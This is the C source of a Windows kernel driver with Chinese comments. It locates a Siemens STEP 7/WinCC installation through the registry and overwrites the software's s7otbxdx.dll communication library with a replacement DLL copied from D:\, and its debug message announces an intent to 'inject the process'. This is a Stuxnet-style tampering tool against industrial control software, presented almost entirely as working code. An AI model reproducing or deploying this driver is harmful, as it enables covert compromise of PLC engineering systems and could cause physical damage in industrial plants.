#include<ntddk.h>
#include<Ntstrsafe.h>

NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrint("This driver is unloading…\n");
	return STATUS_SUCCESS;
}

#ifndef MEM_TAG
#define MEM_TAG 'XXXX'
#endif

NTSTATUS MyOpenFile(
	HANDLE* handle,
	IO_STATUS_BLOCK* io_status,
	CONST PUNICODE_STRING file_path)
{
	NTSTATUS status;
	OBJECT_ATTRIBUTES object_attributes;

	InitializeObjectAttributes(
		&object_attributes,
		file_path,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL, NULL);

	status = ZwCreateFile(
		handle,                         // 文件句柄
		GENERIC_READ | GENERIC_WRITE,   // 打开文件的权限
		&object_attributes,             // 文件对象的描述信息
		io_status,                      // 操作结果结构体
		NULL,                           // 文件创建后的初始大小
		FILE_ATTRIBUTE_NORMAL,          // 文件属性信息
		FILE_SHARE_READ,                // 其他文件打开时的属性
		FILE_OPEN_IF,                   // 如果文件存在，则打开；如果不存在，则创建
		FILE_NON_DIRECTORY_FILE | FILE_RANDOM_ACCESS | FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);

	return status;
}

NTSTATUS MyCopyFile(PUNICODE_STRING target_path, PUNICODE_STRING source_path)
{
	NTSTATUS status;
	// 创建源文件和目标文件句柄
	HANDLE target = NULL;
	HANDLE source = NULL;

	// buffer
	PVOID buffer = NULL;
	// offset
	LARGE_INTEGER offset = { 0 };
	// io_status
	IO_STATUS_BLOCK io_status = { 0 };

	do
	{
		// 分别打开文件得到文件句柄
		MyOpenFile(&source, &io_status, source_path);
		MyOpenFile(&target, &io_status, target_path);

		// 分配一个缓冲区用来存储每次读取的内容
		buffer = (PWCHAR)ExAllocatePoolWithTag(NonPagedPool, 4096, MEM_TAG);

		// ZwReadFile 和 ZwWriteFile 所需的两个参数
		IO_STATUS_BLOCK IoStatus = { 0 };
		ULONG length = 4 * 1024;

		while (1)
		{
			// 读取
			status = ZwReadFile(source, NULL, NULL, NULL,
				&IoStatus, buffer, length, &offset, NULL);
			if (!NT_SUCCESS(status))
			{
				if (status == STATUS_END_OF_FILE)
				{
					status = STATUS_SUCCESS;
				}
				break;
			}

			// 获取实际读到的大小
			length = IoStatus.Information;

			// 根据读取到的实际大小写入到另外一个文件中
			status = ZwWriteFile(target, NULL, NULL, NULL,
				&IoStatus, buffer, length, &offset, NULL);
			if (!NT_SUCCESS(status))
				break;

			// offset 后移
			offset.QuadPart += IoStatus.Information;
		}

	} while (0);

	if (target != NULL)
		ZwClose(target);
	if (source != NULL)
		ZwClose(source);
	if (buffer != NULL)
		ExFreePool(buffer);

	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	DbgPrint("This driver is loading…\n");
	pDriverObject->DriverUnload = (PDRIVER_UNLOAD)DriverUnload;
	DbgPrint("%ws\n", theRegistryPath->Buffer);
	DbgPrint("From kernel to find wincc/step7,and inject the process!\n");
	
	UNICODE_STRING RegUnicodeString;
	HANDLE hRegister;

	RtlInitUnicodeString(&RegUnicodeString, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\S7tgtopx.exe");
	OBJECT_ATTRIBUTES objectAttributes;
	InitializeObjectAttributes(&objectAttributes, &RegUnicodeString, OBJ_CASE_INSENSITIVE| OBJ_KERNEL_HANDLE, NULL, NULL);
	NTSTATUS ntStatus = ZwOpenKey(&hRegister, KEY_ALL_ACCESS, &objectAttributes);
	if (NT_SUCCESS(ntStatus))
	{
		DbgPrint("find S7tgtopx.exe key from register!\n");
		UNICODE_STRING ValueName;
		RtlInitUnicodeString(&ValueName, L"");
		ULONG ulSize;
		ntStatus = ZwQueryValueKey(hRegister,
			&ValueName,
			KeyValuePartialInformation,
			NULL,
			0,
			&ulSize);
		if (ntStatus == STATUS_OBJECT_NAME_NOT_FOUND || ulSize == 0)
		{
			ZwClose(hRegister);
			DbgPrint(("The item is not exist\n"));
			return STATUS_SUCCESS;
		}
		PKEY_VALUE_PARTIAL_INFORMATION pvpi =
			(PKEY_VALUE_PARTIAL_INFORMATION)
			ExAllocatePool(PagedPool, ulSize);
		ntStatus = ZwQueryValueKey(hRegister,
			&ValueName,
			KeyValuePartialInformation,
			pvpi,
			ulSize,
			&ulSize);
		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(hRegister);
			DbgPrint(("Read regsiter error\n"));
			return STATUS_SUCCESS;
		}
		//判断是否为REG_SZ类型
		if (pvpi->Type == REG_SZ)
		{
			DbgPrint("The value:%S\n", pvpi->Data);
		}

		UNICODE_STRING pStep7dll;
		RtlInitUnicodeString(&pStep7dll, L"s7otbxdx.dll");
		UNICODE_STRING pStep7Path;
		RtlInitUnicodeString(&pStep7Path, L"");
		pStep7Path.Buffer = (PWSTR)ExAllocatePool(PagedPool, 0x100);
		pStep7Path.MaximumLength = 0x100;
		pStep7Path.Length = pStep7Path.MaximumLength - 2;
		RtlZeroMemory(pStep7Path.Buffer, pStep7Path.MaximumLength);
		RtlCopyMemory(pStep7Path.Buffer, L"\\??\\", 8);
		RtlCopyMemory(pStep7Path.Buffer + 4, pvpi->Data, pvpi->DataLength - 27);
		RtlStringCbCatW(pStep7Path.Buffer, pStep7Path.MaximumLength, pStep7dll.Buffer);
		pStep7Path.Length = (USHORT)wcslen(pStep7Path.Buffer)*2;
		ZwClose(hRegister);
		ExFreePool(pvpi);
		UNICODE_STRING src = RTL_CONSTANT_STRING(L"\\??\\D:\\s7otbxdx.dll");
		//UNICODE_STRING dst = RTL_CONSTANT_STRING(L"\\??\\C:\\Program Files\\Siemens\\Step7\\S7BIN\\s7otbxdx.dll");
		MyCopyFile(&pStep7Path, &src);
	}
	else
	{
		DbgPrint("not find S7tgtopx.exe key from register!\n");
		return STATUS_SUCCESS;
	}
	return STATUS_SUCCESS;
};